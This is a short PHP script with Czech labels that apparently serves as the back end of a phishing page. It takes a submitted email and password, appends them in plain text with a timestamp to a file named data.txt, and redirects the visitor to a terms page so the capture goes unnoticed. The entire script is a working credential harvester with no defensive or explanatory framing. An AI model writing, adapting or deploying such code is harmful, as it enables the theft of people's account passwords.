<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);
    $timestamp = date('d.m.Y H:i:s'); 

    
    $data = "Email: $email | Heslo: $password | Datum: $timestamp\n";

    
    $file = 'data.txt';
    file_put_contents($file, $data, FILE_APPEND);

    
    header('Location: terms.html');
    exit(); 
} else {
    
    echo 'Chybný požadavek.';
}
?>
